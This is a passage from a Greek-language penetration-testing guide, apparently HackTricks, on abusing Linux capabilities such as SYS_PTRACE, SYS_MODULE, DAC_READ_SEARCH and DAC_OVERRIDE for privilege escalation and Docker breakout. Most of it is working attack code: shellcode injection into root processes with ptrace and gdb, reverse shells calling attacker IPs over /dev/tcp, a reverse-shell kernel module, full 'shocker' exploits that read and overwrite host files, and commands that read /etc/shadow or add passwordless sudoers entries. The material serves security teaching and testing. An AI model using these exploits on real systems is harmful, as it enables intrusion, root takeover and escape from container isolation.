shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Παράδειγμα με δυαδικό αρχείο (gdb)**

`gdb` με δυνατότητα `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Δημιουργήστε ένα shellcode με το msfvenom για να εισαχθεί στη μνήμη μέσω του gdb.

```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f raw -o shellcode
```

Αντικαταστήστε το `<your_ip>` με τη διεύθυνση IP του επιθέτου σας και το `<your_port>` με τη θύρα που θέλετε να χρησιμοποιήσετε. Αυτή η εντολή θα δημιουργήσει ένα αρχείο με το όνομα "shellcode" που περιέχει το shellcode που μπορείτε να εισάγετε στη μνήμη μέσω του gdb.
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Αποσφαλμάτωση ενός διεργασίας root με το gdb και αντιγραφή-επικόλληση των προηγουμένως δημιουργημένων γραμμών gdb:

```bash
gdb -p <PID>
```

Αντιγράψτε και επικολλήστε τις παρακάτω γραμμές gdb:

```gdb
set follow-fork-mode child
set detach-on-fork off
```

Συνεχίστε την αποσφαλμάτωση της διεργασίας root με τις εντολές gdb που χρειάζεστε.
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Παράδειγμα με περιβάλλον (Docker breakout) - Άλλη κατάχρηση του gdb**

Εάν έχει εγκατασταθεί το **GDB** (ή μπορείτε να το εγκαταστήσετε με την εντολή `apk add gdb` ή `apt install gdb` για παράδειγμα), μπορείτε να **αποσφαλματώσετε ένα διεργασία από τον κεντρικό υπολογιστή** και να την καλέσετε να εκτελέσει τη συνάρτηση `system`. (Αυτή η τεχνική απαιτεί επίσης τη δυνατότητα `SYS_ADMIN`).**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Δε θα μπορείτε να δείτε την έξοδο της εκτελούμενης εντολής, αλλά θα εκτελεστεί από αυτήν τη διεργασία (έτσι πάρτε ένα αντίστροφο κέλυφος).

{% hint style="warning" %}
Εάν λάβετε το σφάλμα "Δεν υπάρχει σύμβολο "system" στο τρέχον περιβάλλον.", ελέγξτε το προηγούμενο παράδειγμα φόρτωσης ενός shellcode σε ένα πρόγραμμα μέσω του gdb.
{% endhint %}

**Παράδειγμα με περιβάλλον (Docker breakout) - Εισαγωγή Shellcode**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στον εμπλεκόμενο δοχείο Docker χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Απαρίθμηση των **διεργασιών** που εκτελούνται στο **σύστημα** `ps -eaf`

1. Πάρτε την **αρχιτεκτονική** `uname -m`
2. Βρείτε ένα **shellcode** για την αρχιτεκτονική ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Βρείτε ένα **πρόγραμμα** για να **εισαγάγετε** το **shellcode** στη μνήμη μιας διεργασίας ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Τροποποιήστε** το **shellcode** μέσα στο πρόγραμμα και **μεταγλωττίστε** το `gcc inject.c -o inject`
5. **Εισαγάγετέ** το και αποκτήστε το **shell** σας: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

Το **[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** επιτρέπει σε μια διεργασία να **φορτώνει και να απενεργοποιεί πυρήνας (`init_module(2)`, `finit_module(2)` και `delete_module(2)` κλήσεις συστήματος)**, προσφέροντας άμεση πρόσβαση στις βασικές λειτουργίες του πυρήνα. Αυτή η δυνατότητα παρουσιάζει κρίσιμους κινδύνους ασφάλειας, καθώς επιτρέπει την ανέλιξη προνομιακών δικαιωμάτων και την πλήρη συμβιβασμό του συστήματος μέσω τροποποιήσεων στον πυρήνα, παρακάμπτοντας έτσι όλα τα μηχανισμούς ασφαλείας του Linux, συμπεριλαμβανομένων των Linux Security Modules και της απομόνωσης των ελαχίστων περιβαλλόντων.
**Αυτό σημαίνει ότι μπορείτε** **να εισάγετε/αφαιρέσετε πυρήνας από τον πυρήνα της κεντρικής μονάδας.**

**Παράδειγμα με δυαδικό**

Στο παρακάτω παράδειγμα, το δυαδικό **`python`** έχει αυτήν τη δυνατότητα.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Από προεπιλογή, η εντολή **`modprobe`** ελέγχει τη λίστα εξαρτήσεων και τα αρχεία χαρτογράφησης στον φάκελο **`/lib/modules/$(uname -r)`**.\
Για να εκμεταλλευτούμε αυτό, ας δημιουργήσουμε έναν ψεύτικο φάκελο **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Στη συνέχεια, **μεταγλωττίστε τον πυρήνα του module που μπορείτε να βρείτε 2 παραδείγματα παρακάτω και αντιγράψτε** το στον φάκελο αυτό:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Τέλος, εκτελέστε τον απαιτούμενο κώδικα Python για να φορτώσετε αυτήν την πυρήνας ενότητα:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Παράδειγμα 2 με δυαδικό αρχείο**

Στο παρακάτω παράδειγμα, το δυαδικό αρχείο **`kmod`** έχει αυτήν τη δυνατότητα.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Που σημαίνει ότι είναι δυνατόν να χρησιμοποιηθεί η εντολή **`insmod`** για να εισαχθεί ένα πυρήνας module. Ακολουθήστε το παρακάτω παράδειγμα για να αποκτήσετε ένα **αντίστροφο κέλυφος** καταχρώντας αυτή την ικανότητα.

**Παράδειγμα με περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες ικανότητες μέσα στο docker container χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Μέσα στην προηγούμενη έξοδο μπορείτε να δείτε ότι η δυνατότητα **SYS\_MODULE** είναι ενεργοποιημένη.

**Δημιουργήστε** το **πυρήνας module** που θα εκτελέσει ένα αντίστροφο κέλυφος και το **Makefile** για να το **μεταγλωττίσετε**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Το κενό πριν από κάθε λέξη στο αρχείο Makefile **πρέπει να είναι ένα tab, όχι κενά**!
{% endhint %}

Εκτελέστε την εντολή `make` για να το μεταγλωττίσετε.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Τέλος, ξεκινήστε το `nc` μέσα σε ένα κέλυφος και **φορτώστε τον ενότητα** από ένα άλλο κέλυφος και θα καταγράψετε το κέλυφος στη διεργασία nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Κατάχρηση της δυνατότητας SYS\_MODULE" από** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Ένα άλλο παράδειγμα αυτής της τεχνικής μπορεί να βρεθεί στο [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει σε ένα διεργασία να **παρακάμψει τις άδειες για την ανάγνωση αρχείων και για την ανάγνωση και εκτέλεση καταλόγων**. Ο κύριος σκοπός του είναι για αναζήτηση αρχείων ή ανάγνωση αρχείων. Ωστόσο, επιτρέπει επίσης σε μια διεργασία να χρησιμοποιήσει τη συνάρτηση `open_by_handle_at(2)`, η οποία μπορεί να έχει πρόσβαση σε οποιοδήποτε αρχείο, συμπεριλαμβανομένων αυτών εκτός του mount namespace της διεργασίας. Το handle που χρησιμοποιείται στην `open_by_handle_at(2)` πρέπει να είναι ένα μη διαφανές αναγνωριστικό που αποκτήθηκε μέσω της `name_to_handle_at(2)`, αλλά μπορεί να περιλαμβάνει ευαίσθητες πληροφορίες όπως αριθμοί inode που είναι ευάλωτοι σε παρεμβολή. Ο δυνητικός κίνδυνος εκμετάλλευσης αυτής της δυνατότητας, ιδιαίτερα στο πλαίσιο των εμπορευματοκιβωτίων Docker, αποδείχθηκε από τον Sebastian Krahmer με την εκμετάλλευση shocker, όπως αναλύθηκε [εδώ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Αυτό σημαίνει ότι μπορείτε να παρακάμψετε τους έλεγχους άδειας ανάγνωσης αρχείων και άδειας ανάγνωσης/εκτέλεσης καταλόγων.**

**Παράδειγμα με δυαδικό αρχείο**

Το δυαδικό αρχείο θα μπορεί να διαβάσει οποιοδήποτε αρχείο. Έτσι, αν ένα αρχείο όπως το tar έχει αυτή τη δυνατότητα, θα μπορεί να διαβάσει το αρχείο shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Παράδειγμα με το binary2**

Σε αυτήν την περίπτωση, ας υποθέσουμε ότι το δυαδικό αρχείο **`python`** έχει αυτήν τη δυνατότητα. Για να εμφανίσετε τα αρχεία του συστήματος ως ριζοχρονικός χρήστης, μπορείτε να κάνετε:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Και για να διαβάσετε ένα αρχείο μπορείτε να κάνετε:
```python
print(open("/etc/shadow", "r").read())
```
**Παράδειγμα στο περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στον docker container χρησιμοποιώντας:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Μέσα στην προηγούμενη έξοδο μπορείτε να δείτε ότι η δυνατότητα **DAC\_READ\_SEARCH** είναι ενεργοποιημένη. Ως αποτέλεσμα, ο container μπορεί να **αναλύει διεργασίες**.

Μπορείτε να μάθετε πώς λειτουργεί η ακόλουθη εκμετάλλευση στο [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) αλλά για να συνοψίσουμε, η δυνατότητα **CAP\_DAC\_READ\_SEARCH** όχι μόνο μας επιτρέπει να περιηγηθούμε στο σύστημα αρχείων χωρίς έλεγχο δικαιωμάτων, αλλά αφαιρεί επίσης οποιονδήποτε έλεγχο για την συνάρτηση _**open\_by\_handle\_at(2)**_ και **μπορεί να επιτρέψει στη διεργασία μας να διαβάσει ευαίσθητα αρχεία που έχουν ανοιχτεί από άλλες διεργασίες**.

Το αρχικό exploit που καταχράται αυτά τα δικαιώματα για να διαβάσει αρχεία από τον host μπορεί να βρεθεί εδώ: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), το ακόλουθο είναι μια **τροποποιημένη έκδοση που σας επιτρέπει να υποδείξετε το αρχείο που θέλετε να διαβάσετε ως πρώτο όρισμα και να το αποθηκεύσετε σε ένα αρχείο**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Το exploit χρειάζεται να βρει ένα δείκτη για κάτι που είναι προσαρτημένο στον κεντρικό υπολογιστή. Το αρχικό exploit χρησιμοποιούσε το αρχείο /.dockerinit και αυτή η τροποποιημένη έκδοση χρησιμοποιεί το /etc/hostname. Αν το exploit δεν λειτουργεί, ίσως χρειαστεί να ορίσετε ένα διαφορετικό αρχείο. Για να βρείτε ένα αρχείο που είναι προσαρτημένο στον κεντρικό υπολογιστή, απλά εκτελέστε την εντολή mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Κατάχρηση της δυνατότητας DAC\_READ\_SEARCH" από το** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σχετικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένας ζωντανός σημείο συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Αυτό σημαίνει ότι μπορείτε να παρακάμψετε τους ελέγχους άδειας εγγραφής σε οποιοδήποτε αρχείο, έτσι μπορείτε να γράψετε οποιοδήποτε αρχείο.**

Υπάρχουν πολλά αρχεία που μπορείτε να **αντικαταστήσετε για να αναβαθμίσετε τα δικαιώματα,** [**μπορείτε να πάρετε ιδέες από εδώ**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Παράδειγμα με δυαδικό αρχείο**

Σε αυτό το παράδειγμα, το vim έχει αυτή τη δυνατότητα, οπότε μπορείτε να τροποποιήσετε οποιοδήποτε αρχείο όπως το _passwd_, _sudoers_ ή _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Παράδειγμα με το δυαδικό 2**

Σε αυτό το παράδειγμα, το δυαδικό **`python`** θα έχει αυτήν τη δυνατότητα. Μπορείτε να χρησιμοποιήσετε το python για να αντικαταστήσετε οποιοδήποτε αρχείο:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Παράδειγμα με περιβάλλον + CAP_DAC_READ_SEARCH (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στον docker container χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Καταρχήν, διαβάστε το προηγούμενο τμήμα που [καταχράται τη δυνατότητα DAC\_READ\_SEARCH για να διαβάσει αυθαίρετα αρχεία](linux-capabilities.md#cap\_dac\_read\_search) του υπολογιστή και **μεταγλωτίστε** την εκμετάλλευση.\
Στη συνέχεια, **μεταγλωτίστε την παρακάτω έκδοση της εκμετάλλευσης shocker** που θα σας επιτρέψει να **γράψετε αυθαίρετα αρχεία** στο σύστημα αρχείων του υπολογιστή:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Για να δραπετεύσετε από το docker container μπορείτε να **κατεβάσετε** τα αρχεία `/etc/shadow` και `/etc/passwd` από τον host, να **προσθέσετε** έναν **νέο χρήστη** σε αυτά και να χρησιμοποιήσετε το **`shocker_write`** για να τα αντικαταστήσετε. Έπειτα, **αποκτήστε πρόσβαση** μέσω **ssh**.

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing DAC\_OVERRIDE Capability" από την** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Αυτό σημαίνει ότι είναι δυνατή η αλλαγή του ιδιοκτήτη οποιουδήποτε αρχείου.**

**Παράδειγμα με δυαδικό αρχείο**

Ας υποθέσουμε ότι το δυαδικό αρχείο **`python`** έχει αυτήν τη δυνατότητα, μπορείτε να **αλλάξετε** τον **ιδιοκτήτη** του αρχείου **shadow**, να **αλλάξετε τον κωδικό root** και να αναβαθμίσετε τα δικαιώματα.
```bash
